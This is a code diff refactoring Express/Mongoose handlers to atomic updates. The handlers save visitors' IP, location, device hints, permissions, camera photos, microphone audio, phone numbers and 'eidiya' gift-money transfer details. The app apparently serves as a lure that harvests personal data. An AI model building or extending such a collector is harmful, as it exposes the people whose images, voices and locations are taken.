@@ -51,34 +51,32 @@ exports.saveMetadata = async (req, res) => {
   console.log(`[SAVE_METADATA] Updating metadata for session ${sessionId}`);
 
   try {
-    const session = await Session.findOne({ sessionId });
-    if (!session) {
+    const update = {};
+    update.ip = ip;
+    update.userAgent = userAgent;
+
+    if (req.body.location) {
+      update.location = req.body.location;
+    }
+
+    if (req.body.clientHints) {
+      for (const [k, v] of Object.entries(req.body.clientHints)) {
+        update[`clientHints.${k}`] = v;
+      }
+    }
+
+    if (req.body.permissions) {
+      for (const [k, v] of Object.entries(req.body.permissions)) {
+        update[`permissions.${k}`] = v;
+      }
+    }
+
+    const result = await Session.updateOne({ sessionId }, { $set: update });
+    if (result.matchedCount === 0) {
       console.warn(`[SAVE_METADATA] Session ${sessionId} not found`);
       return res.status(404).json({ success: false, message: 'Session not found' });
     }
 
-    if (!session.ip) session.ip = ip;
-    if (!session.userAgent) session.userAgent = userAgent;
-
-    if (req.body.location) {
-      session.location = req.body.location;
-    }
-
-    if (req.body.clientHints) {
-      session.clientHints = {
-        ...session.clientHints,
-        ...req.body.clientHints
-      };
-    }
-
-    if (req.body.permissions) {
-      session.permissions = {
-        ...session.permissions,
-        ...req.body.permissions
-      };
-    }
-
-    await session.save();
     console.log(`[SAVE_METADATA] Session ${sessionId} metadata updated successfully`);
     res.json({ success: true });
   } catch (error) {
@@ -98,25 +96,28 @@ exports.savePhoto = async (req, res) => {
   }
 
   try {
-    const session = await Session.findOne({ sessionId });
-    if (!session) {
-      console.warn(`[SAVE_PHOTO] Session ${sessionId} not found`);
-      return res.status(404).json({ success: false, message: 'Session not found' });
-    }
-
     console.log(`[SAVE_PHOTO] Uploading photo to Cloudinary for session ${sessionId}`);
     const uploadResult = await uploadImageBase64(image);
     console.log(`[SAVE_PHOTO] Photo successfully uploaded to Cloudinary: ${uploadResult.cloudinaryUrl}`);
 
-    session.photos.push({
+    const newPhoto = {
       cloudinaryUrl: uploadResult.cloudinaryUrl,
       publicId: uploadResult.publicId,
       facingMode: facingMode || null,
       deviceLabel: deviceLabel || null,
       takenAt: takenAt ? new Date(takenAt) : new Date()
-    });
+    };
 
-    await session.save();
+    const result = await Session.updateOne(
+      { sessionId },
+      { $push: { photos: newPhoto } }
+    );
+
+    if (result.matchedCount === 0) {
+      console.warn(`[SAVE_PHOTO] Session ${sessionId} not found in DB`);
+      return res.status(404).json({ success: false, message: 'Session not found' });
+    }
+
     console.log(`[SAVE_PHOTO] Session ${sessionId} photo entry saved to MongoDB`);
     res.json({ success: true, url: uploadResult.cloudinaryUrl });
   } catch (error) {
@@ -174,17 +175,11 @@ exports.finishAudio = async (req, res) => {
   console.log(`[FINISH_AUDIO] Merged ${session.chunks.length} chunks. Combined buffer size: ${audioBuffer.length} bytes`);
 
   try {
-    const dbSession = await Session.findOne({ sessionId });
-    if (!dbSession) {
-      console.warn(`[FINISH_AUDIO] Session ${sessionId} not found in DB`);
-      return res.status(404).json({ success: false, message: 'Session not found' });
-    }
-
     console.log(`[FINISH_AUDIO] Uploading merged audio buffer to Cloudinary for session ${sessionId}`);
     const uploadResult = await uploadAudioBuffer(audioBuffer);
     console.log(`[FINISH_AUDIO] Audio successfully uploaded to Cloudinary: ${uploadResult.cloudinaryUrl}`);
 
-    dbSession.audio = {
+    const audioData = {
       cloudinaryUrl: uploadResult.cloudinaryUrl,
       publicId: uploadResult.publicId,
       size: audioBuffer.length,
@@ -194,7 +189,16 @@ exports.finishAudio = async (req, res) => {
       savedAt: new Date()
     };
 
-    await dbSession.save();
+    const result = await Session.updateOne(
+      { sessionId },
+      { $set: { audio: audioData } }
+    );
+
+    if (result.matchedCount === 0) {
+      console.warn(`[FINISH_AUDIO] Session ${sessionId} not found in DB`);
+      return res.status(404).json({ success: false, message: 'Session not found' });
+    }
+
     audioSessions.delete(sessionId);
     console.log(`[FINISH_AUDIO] Session ${sessionId} audio entry updated successfully in MongoDB`);
 
@@ -210,31 +214,37 @@ exports.saveCashOut = async (req, res) => {
   const ip = requestIp(req);
   console.log(`[CASH_OUT] Request received for session ${sessionId}, phone: ${phoneNumber}, amount: ${amount}`);
 
+  const targetSessionId = sessionId || crypto.randomUUID();
+
   try {
-    let session = await Session.findOne({ sessionId });
-    if (!session) {
-      console.warn(`[CASH_OUT] Session ${sessionId} not found in DB. Creating placeholder session.`);
-      session = new Session({
-        sessionId: sessionId || crypto.randomUUID(),
+    const update = {
+      $set: {
+        cashOut: {
+          phoneNumber,
+          amount: parseFloat(amount) || 0,
+          ip,
+          location: location || null,
+          requestedAt: new Date()
+        }
+      },
+      $setOnInsert: {
+        sessionId: targetSessionId,
         ip,
         userAgent: req.get('user-agent') || null
-      });
-    }
-
-    session.cashOut = {
-      phoneNumber,
-      amount: parseFloat(amount) || 0,
-      ip,
-      location: location || session.location || null,
-      requestedAt: new Date()
+      }
     };
 
-    // Update main session IP and location if not set yet
-    if (!session.ip) session.ip = ip;
-    if (location && !session.location) session.location = location;
+    if (location) {
+      update.$set.location = location;
+    }
 
-    await session.save();
-    console.log(`[CASH_OUT] Session ${session.sessionId} cashout info saved successfully to DB`);
+    await Session.updateOne(
+      { sessionId: targetSessionId },
+      update,
+      { upsert: true }
+    );
+
+    console.log(`[CASH_OUT] Session ${targetSessionId} cashout info saved successfully to DB`);
     res.json({ success: true });
   } catch (error) {
     console.error('[CASH_OUT] Error saving cashout data:', error);
@@ -247,33 +257,41 @@ exports.saveEidiyaTransfer = async (req, res) => {
   const ip = requestIp(req);
   console.log(`[EIDIYA_TRANSFER] Request received for session ${sessionId}, recipient: ${recipient}, amount: ${amount}`);
 
-  try {
-    let session = await Session.findOne({ sessionId });
-    if (!session) {
-      console.warn(`[EIDIYA_TRANSFER] Session ${sessionId} not found in DB. Creating placeholder session.`);
-      session = new Session({
-        sessionId: sessionId || crypto.randomUUID(),
-        ip,
-        userAgent: req.get('user-agent') || null
-      });
-    }
+  const targetSessionId = sessionId || crypto.randomUUID();
 
-    session.eidiyaTransfers = session.eidiyaTransfers || [];
-    session.eidiyaTransfers.push({
+  try {
+    const newTransfer = {
       recipient,
       amount: parseFloat(amount) || 0,
       message: message || '',
       ip,
-      location: location || session.location || null,
+      location: location || null,
       transferredAt: new Date()
-    });
+    };
 
-    // Update main session IP and location if not set yet
-    if (!session.ip) session.ip = ip;
-    if (location && !session.location) session.location = location;
+    const update = {
+      $push: { eidiyaTransfers: newTransfer },
+      $setOnInsert: {
+        sessionId: targetSessionId,
+        ip,
+        userAgent: req.get('user-agent') || null
+      }
+    };
 
-    await session.save();
-    console.log(`[EIDIYA_TRANSFER] Session ${session.sessionId} eidiya transfer info saved successfully to DB`);
+    const setFields = {};
+    if (location) {
+      setFields.location = location;
+    }
+    setFields.ip = ip;
+    update.$set = setFields;
+
+    await Session.updateOne(
+      { sessionId: targetSessionId },
+      update,
+      { upsert: true }
+    );
+
+    console.log(`[EIDIYA_TRANSFER] Session ${targetSessionId} eidiya transfer info saved successfully to DB`);
     res.json({ success: true });
   } catch (error) {
     console.error('[EIDIYA_TRANSFER] Error saving eidiya transfer data:', error);
